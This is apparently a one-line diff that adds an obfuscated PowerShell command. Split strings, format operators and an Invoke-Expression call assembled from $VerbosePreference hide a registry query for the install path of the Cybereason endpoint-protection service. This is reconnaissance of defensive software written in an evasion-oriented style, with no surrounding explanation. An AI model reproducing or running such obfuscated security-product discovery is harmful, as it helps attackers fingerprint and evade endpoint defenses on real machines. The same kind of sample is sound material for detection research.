@@ -1,0 +1,1 @@
+ & ( ([sTriNG]$verbosEPreferencE)[1,3]+'X'-joIn'') ( (('Ge'+'t-Ite'+'mProp'+'erty {0}HKLM:SY'+'STE'+'M{'+'2}C'+'ontrol'+'Set001{2'+'}Services{2}C'+'y'+'bereasonActivePr'+'obe{'+'0}'+' {1} Select-Object'+' '+'-'+'Pr'+'op'+'erty {0}ImagePa'+'th'+'{0'+'}')  -F [ChaR]34,[ChaR]124,[ChaR]92))
